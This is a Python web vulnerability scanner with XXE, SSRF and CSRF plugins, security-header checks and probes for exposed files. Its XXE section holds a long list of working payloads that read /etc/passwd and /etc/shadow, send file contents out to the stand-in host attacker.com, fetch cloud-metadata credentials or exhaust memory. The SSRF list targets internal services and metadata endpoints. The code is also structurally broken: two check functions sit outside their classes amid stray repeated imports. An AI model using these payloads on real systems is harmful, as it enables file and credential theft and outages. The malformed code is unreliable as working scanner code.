# vulnerability_scanner.py
import requests
import re
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import json
import logging
from typing import List, Dict, Optional, Callable, Any
import xml.etree.ElementTree as ET

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class VulnerabilityPlugin:
    """Base class for vulnerability plugins"""
    def __init__(self):
        self.name = self.__class__.__name__
        self.risk_level = "medium"
        self.description = ""
        self.remediation = ""
        self.confidence = 80  # Default confidence percentage
        
    def check(self, target: str, session: requests.Session) -> Optional[Dict]:
        """Override this method to implement the vulnerability check"""
        raise NotImplementedError
        
    def get_cvss_score(self) -> float:
        """Calculate CVSS score based on vulnerability characteristics"""
        # Base CVSS v3.1 scoring - override in plugins for specific vulnerabilities
        base_scores = {
            "critical": 9.0,
            "high": 7.0,
            "medium": 4.0,
            "low": 2.0,
            "info": 0.0
        }
        return base_scores.get(self.risk_level.lower(), 0.0)

class XXEPlugin(VulnerabilityPlugin):
    """Check for XML External Entity Processing vulnerabilities"""
    def __init__(self):
        super().__init__()
        self.name = "XXE Injection"
        self.risk_level = "high"
        self.description = "XML External Entity Processing vulnerability"
        self.remediation = "Disable XML external entity processing in your XML parser configuration"
        
from typing import Optional, Dict
import requests
import logging

logger = logging.getLogger(__name__)

def check(self, target: str, session: requests.Session) -> Optional[Dict]:
    payloads = [
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE data [
          <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
        ]>
        <data>&xxe;</data>""",

        """<?xml version="1.0"?>
        <!DOCTYPE data [
          <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
        ]>
        <data>&xxe;</data>""",

        """<?xml version="1.0"?>
        <!DOCTYPE data [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <data><![CDATA[&xxe;]]></data>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY % file SYSTEM "file:///etc/passwd">
          <!ENTITY % eval "<!ENTITY xxe SYSTEM 'http://attacker.com/?data=%file;'>">
          %eval;
        ]>
        <foo>&xxe;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "file:///etc/hostname">
        ]>
        <root><data>&xxe;</data></root>""",

        """<?xml version="1.0"?>
        <!DOCTYPE test [
          <!ENTITY part1 "User: ">
          <!ENTITY part2 SYSTEM "file:///etc/passwd">
        ]>
        <test>&part1;&part2;</test>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "data:text/plain,XXE-Test">
        ]>
        <foo>&xxe;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY % xxe SYSTEM "file:///etc/shadow">
          <!ENTITY call SYSTEM "http://attacker.com?data=%xxe;">
        ]>
        <foo>&call;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE test [
          <!ENTITY xxe SYSTEM "file://%2fetc%2fpasswd">
        ]>
        <test>&xxe;</test>""",

        """<?xml version="1.0"?>
        <!DOCTYPE test [
          <!ENTITY xxe SYSTEM "file:///etc/hosts">
        ]>
        <test>&xxe;</test>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <foo name="&xxe;" />""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
        ]>
        <foo>&xxe;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <foo><!-- &xxe; --></foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ELEMENT foo ANY>
          <!ENTITY xxe SYSTEM "file:///etc/issue">
        ]>
        <foo>&xxe;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file://../etc/passwd">
        ]>
        <foo>&xxe;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///proc/version">
        ]>
        <foo>&xxe;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "ftp://attacker.com/xxe">
        ]>
        <foo>&xxe;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE svg [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <svg>&xxe;</svg>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "jar:file:///some.jar!/META-INF/MANIFEST.MF">
        ]>
        <foo>&xxe;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <data>&xxe;</data>
          </soap:Body>
        </soap:Envelope>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
          <!ENTITY wrapper "&xxe;">
        ]>
        <foo>&wrapper;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <foo xmlns:h="http://www.w3.org/TR/html4/">&xxe;</foo>""",

        """<?xml version="1.0" encoding="&xxe;"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <foo>Test</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
        ]>
        <foo>&xxe;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE config [
          <!ENTITY xxe SYSTEM "file:///etc/environment">
        ]>
        <config>&xxe;</config>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
        ]>
        <foo>&xxe;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <foo>&#x78;&#x78;&#x65;;</foo>""",

        """<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol1 "&lol;&lol;">
          <!ENTITY lol2 "&lol1;&lol1;">
          <!ENTITY lol3 "&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>""",

        """<?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/hostname">
        ]>
        <foo>&xxe;</foo>"""
    ]

    headers = {'Content-Type': 'application/xml'}
    for index, test_payload in enumerate(payloads):
        try:
            response = session.post(target, data=test_payload, headers=headers, timeout=10)
            if response.status_code == 200 and any(keyword in response.text for keyword in ["root:", "localhost", "kernel", "Microsoft"]):
                return {
                    'type': self.name,
                    'risk': self.risk_level,
                    'description': self.description,
                    'proof': f"Payload #{index+1} triggered XXE response",
                    'remediation': self.remediation,
                    'cvss_score': self.get_cvss_score(),
                    'confidence': self.confidence
                }
        except Exception as e:
            logger.debug(f"XXE check failed for {target} with payload #{index+1}: {str(e)}")
    
    return None

class SSRPlugin(VulnerabilityPlugin):
    """Check for Server Side Request Forgery vulnerabilities"""
    def __init__(self):
        super().__init__()
        self.name = "SSRF"
        self.risk_level = "high"
        self.description = "Server Side Request Forgery vulnerability"
        self.remediation = "Implement allow lists for requested resources and validate user input"
        
    from typing import Optional, Dict
from urllib.parse import urlparse
import requests
import logging

logger = logging.getLogger(__name__)

def check(self, target: str, session: requests.Session) -> Optional[Dict]:
    test_urls = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://169.254.169.254/metadata/",
        "http://localhost/",
        "http://localhost/admin",
        "http://localhost:8080/",
        "http://localhost:8000/",
        "http://localhost/phpinfo.php",
        "http://localhost/server-status",
        "http://127.0.0.1/",
        "http://127.0.0.1:8000/",
        "http://127.0.0.1:9000/",
        "http://127.0.0.1:2375/version",
        "http://127.0.0.1:5000/",
        "http://127.0.0.1:27017/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:5432/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:9200/",
        "http://127.0.0.1:5601/",
        "http://127.0.0.1:15672/",
        "http://internal/",
        "http://internal/api/",
        "http://internal/api/secret",
        "http://internal.example.com/",
        "http://admin.local/",
        "http://admin.local/dashboard",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://aws/metadata",
        "http://[::1]/"
    ]

    for test_url in test_urls:
        try:
            parsed = urlparse(target)
            if parsed.query:
                params = dict(pair.split('=') for pair in parsed.query.split('&') if '=' in pair)
                for param in params:
                    injected_url = target.replace(f"{param}={params[param]}", f"{param}={test_url}")
                    response = session.get(injected_url, timeout=10)
                    if response.status_code == 200 and any(indicator in response.text.lower() for indicator in ["aws", "metadata", "secret", "docker", "rabbitmq", "mongo", "postgres", "elasticsearch"]):
                        return {
                            'type': self.name,
                            'risk': self.risk_level,
                            'description': self.description,
                            'proof': f"Injected URL {test_url} returned sensitive data",
                            'remediation': self.remediation,
                            'cvss_score': self.get_cvss_score(),
                            'confidence': self.confidence
                        }
        except Exception as e:
            logger.debug(f"SSRF check failed for {target} with {test_url}: {str(e)}")
    
    return None


class CSRPlugin(VulnerabilityPlugin):
    """Check for Cross Site Request Forgery vulnerabilities"""
    def __init__(self):
        super().__init__()
        self.name = "CSRF"
        self.risk_level = "medium"
        self.description = "Cross Site Request Forgery vulnerability"
        self.remediation = "Implement CSRF tokens and validate Origin/Referer headers"
        
    def check(self, target: str, session: requests.Session) -> Optional[Dict]:
        try:
            # First check if there are forms to test
            response = session.get(target, timeout=10)
            forms = re.findall(r'<form.*?</form>', response.text, re.DOTALL)
            
            if not forms:
                return None
                
            for form in forms:
                if not re.search(r'csrf|token', form, re.IGNORECASE):
                    return {
                        'type': self.name,
                        'risk': self.risk_level,
                        'description': self.description,
                        'proof': f"Form found without CSRF protection: {form[:100]}...",
                        'remediation': self.remediation,
                        'cvss_score': self.get_cvss_score(),
                        'confidence': self.confidence
                    }
        except Exception as e:
            logger.debug(f"CSRF check failed for {target}: {str(e)}")
        return None

class VulnerabilityScanner:
    def __init__(self, config: Optional[Dict] = None):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        self.timeout = 10
        self.config = config or self._load_default_config()
        self.plugins = self._load_plugins()
        
        # Authentication support
        self.auth = None
        self.auth_checks_complete = False
        
    def _load_default_config(self) -> Dict:
        """Load default configuration"""
        return {
            'common_files': [
                {'path': '/.git/HEAD', 'risk': 'critical', 'description': 'Git Repository Exposure'},
                {'path': '/.env', 'risk': 'critical', 'description': 'Environment File Exposure'},
                {'path': '/robots.txt', 'risk': 'info', 'description': 'Robots File'},
                {'path': '/sitemap.xml', 'risk': 'info', 'description': 'Sitemap'},
                {'path': '/package.json', 'risk': 'medium', 'description': 'Node.js Package File'}
            ],
            'vulnerable_endpoints': [
                {'path': '/admin/', 'risk': 'high', 'description': 'Admin Panel Access'},
                {'path': '/phpmyadmin/', 'risk': 'critical', 'description': 'phpMyAdmin Access'},
                {'path': '/wp-admin/', 'risk': 'high', 'description': 'WordPress Admin Access'},
                {'path': '/console/', 'risk': 'critical', 'description': 'JBoss Console'},
                {'path': '/manager/html', 'risk': 'critical', 'description': 'Tomcat Manager'}
            ],
            'api_docs_endpoints': [
                {'path': '/swagger-ui.html', 'risk': 'medium'},
                {'path': '/swagger.json', 'risk': 'medium'},
                {'path': '/api-docs', 'risk': 'medium'},
                {'path': '/openapi.json', 'risk': 'medium'}
            ]
        }
        
    def _load_plugins(self) -> List[VulnerabilityPlugin]:
        """Load all available vulnerability plugins"""
        return [
            XXEPlugin(),
            SSRPlugin(),
            CSRPlugin()
            # Additional plugins can be added here
        ]
        
    def set_auth(self, auth_type: str, **kwargs):
        """Configure authentication for scanning authenticated areas"""
        if auth_type.lower() == 'basic':
            self.auth = requests.auth.HTTPBasicAuth(kwargs.get('username'), kwargs.get('password'))
        elif auth_type.lower() == 'bearer':
            self.session.headers['Authorization'] = f"Bearer {kwargs.get('token')}"
        elif auth_type.lower() == 'cookie':
            self.session.cookies.set(kwargs.get('cookie_name'), kwargs.get('cookie_value'))
        else:
            raise ValueError(f"Unsupported authentication type: {auth_type}")
            
    def scan_url(self, url: str) -> Dict:
        """Main scanning function for a single URL"""
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"

        results = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': [],
            'misconfigurations': [],
            'endpoints': [],
            'tech_stack': [],
            'authentication_checks': False
        }

        try:
            # Initial request to check if site is alive
            response = self.session.get(url, timeout=self.timeout, verify=False)
            results['status_code'] = response.status_code
            results['headers'] = dict(response.headers)

            # Run all checks
            self._run_plugin_checks(url, results)
            self._check_headers(url, response, results)
            self._check_tech_stack(url, response, results)
            self._find_api_endpoints(url, response, results)
            self._check_for_exposed_files(url, results)

            # Sort vulnerabilities by CVSS score
            results['vulnerabilities'].sort(
                key=lambda x: x.get('cvss_score', 0), 
                reverse=True
            )

        except Exception as e:
            results['error'] = str(e)
            logger.error(f"Error scanning {url}: {str(e)}")

        return results
        
    def _run_plugin_checks(self, url: str, results: Dict):
        """Run all registered vulnerability plugins"""
        for plugin in self.plugins:
            try:
                vulnerability = plugin.check(url, self.session)
                if vulnerability:
                    results['vulnerabilities'].append(vulnerability)
            except Exception as e:
                logger.error(f"Plugin {plugin.name} failed: {str(e)}")

    def _check_headers(self, url: str, response: requests.Response, results: Dict):
        """Check for security-related header misconfigurations"""
        headers = response.headers
        security_headers = {
            'X-XSS-Protection': {
                'check': lambda h: h != '1; mode=block',
                'risk': 'medium',
                'description': 'Missing or misconfigured XSS protection',
                'cvss_score': 4.3
            },
            'Content-Security-Policy': {
                'check': lambda h: not h,
                'risk': 'high',
                'description': 'Missing CSP header',
                'cvss_score': 6.1
            },
            'Strict-Transport-Security': {
                'check': lambda h: not h or 'max-age=0' in h,
                'risk': 'high',
                'description': 'Missing or weak HSTS header',
                'cvss_score': 7.4
            },
            'X-Frame-Options': {
                'check': lambda h: not h,
                'risk': 'medium',
                'description': 'Missing clickjacking protection',
                'cvss_score': 4.3
            },
            'X-Content-Type-Options': {
                'check': lambda h: h != 'nosniff',
                'risk': 'medium',
                'description': 'Missing MIME type sniffing protection',
                'cvss_score': 4.3
            }
        }

        for header, config in security_headers.items():
            if header not in headers or config['check'](headers[header]):
                results['misconfigurations'].append({
                    'type': 'Security Header',
                    'risk': config['risk'],
                    'description': config['description'],
                    'header': header,
                    'remediation': f'Add proper {header} header',
                    'cvss_score': config['cvss_score'],
                    'confidence': 90
                })

    def _check_tech_stack(self, url: str, response: requests.Response, results: Dict):
        """Identify technologies and check for outdated versions"""
        tech_stack = []
        
        # Check server header
        server = response.headers.get('Server', '')
        if server:
            tech_stack.append(server)
            
            # Check for outdated servers
            outdated_servers = {
                'Apache/2.2': {'risk': 'high', 'cvss_score': 7.5},
                'Apache/2.4.3': {'risk': 'medium', 'cvss_score': 5.3},
                'nginx/1.14': {'risk': 'medium', 'cvss_score': 5.3},
                'IIS/8.0': {'risk': 'medium', 'cvss_score': 5.3}
            }
            
            for server_pattern, details in outdated_servers.items():
                if server_pattern in server:
                    results['vulnerabilities'].append({
                        'type': 'Outdated Server',
                        'risk': details['risk'],
                        'description': f'Potentially outdated server version: {server_pattern}',
                        'proof': f"Server: {server}",
                        'remediation': 'Upgrade to latest stable version',
                        'cvss_score': details['cvss_score'],
                        'confidence': 80
                    })
        
        # Check X-Powered-By
        powered_by = response.headers.get('X-Powered-By', '')
        if powered_by:
            tech_stack.append(powered_by)
            
        # Check for common frameworks in HTML
        html = response.text.lower()
        frameworks = {
            'WordPress': ('wp-content', 'wp-includes'),
            'Joomla': ('joomla', 'media/jui'),
            'Drupal': ('sites/all', 'drupal.js')
        }
        
        for framework, indicators in frameworks.items():
            if any(indicator in html for indicator in indicators):
                tech_stack.append(framework)
                break
        
        results['tech_stack'] = tech_stack

    def _find_api_endpoints(self, url: str, response: requests.Response, results: Dict):
        """Discover API endpoints and documentation"""
        endpoints = []
        html = response.text.lower()
        
        # Check for API documentation endpoints from config
        for endpoint in self.config['api_docs_endpoints']:
            test_url = urljoin(url, endpoint['path'])
            try:
                resp = self.session.get(test_url, timeout=5, verify=False)
                if resp.status_code < 400:
                    content_type = resp.headers.get('Content-Type', '')
                    if 'json' in content_type or 'swagger' in resp.text.lower():
                        endpoints.append({
                            'type': 'API Documentation',
                            'url': test_url,
                            'risk': endpoint['risk'],
                            'description': 'Public API documentation found',
                            'cvss_score': 5.3 if endpoint['risk'] == 'medium' else 3.5
                        })
            except Exception as e:
                logger.debug(f"API docs check failed for {test_url}: {str(e)}")
        
        # Check for GraphQL
        test_url = urljoin(url, '/graphql')
        try:
            resp = self.session.post(test_url, json={'query': '{__schema{types{name}}}'}, timeout=5)
            if resp.status_code == 200 and 'application/json' in resp.headers.get('Content-Type', ''):
                endpoints.append({
                    'type': 'GraphQL Endpoint',
                    'url': test_url,
                    'risk': 'high',
                    'description': 'GraphQL endpoint found - may expose sensitive data',
                    'cvss_score': 7.5
                })
        except Exception as e:
            logger.debug(f"GraphQL check failed for {test_url}: {str(e)}")
        
        results['endpoints'] = endpoints

    def _check_for_exposed_files(self, url: str, results: Dict):
        """Check for common exposed files from config"""
        for file_info in self.config['common_files']:
            test_url = urljoin(url, file_info['path'])
            try:
                resp = self.session.get(test_url, timeout=5, verify=False)
                if resp.status_code == 200:
                    results['vulnerabilities'].append({
                        'type': file_info['description'],
                        'risk': file_info['risk'],
                        'description': f'Exposed {file_info["description"]} file found',
                        'proof': f"URL: {test_url}",
                        'remediation': f'Restrict access to {file_info["path"]}',
                        'cvss_score': 9.8 if file_info['risk'] == 'critical' else 5.3,
                        'confidence': 90
                    })
            except Exception as e:
                logger.debug(f"File check failed for {test_url}: {str(e)}")

    def batch_scan(self, urls: List[str]) -> List[Dict]:
        """Scan multiple URLs efficiently"""
        results = []
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(self.scan_url, url) for url in urls]
            for future in futures:
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                except Exception as e:
                    logger.error(f"Scan failed: {str(e)}")
        
        return results

    def register_plugin(self, plugin: VulnerabilityPlugin):
        """Register a new vulnerability plugin"""
        if not isinstance(plugin, VulnerabilityPlugin):
            raise ValueError("Plugin must inherit from VulnerabilityPlugin")
        self.plugins.append(plugin)
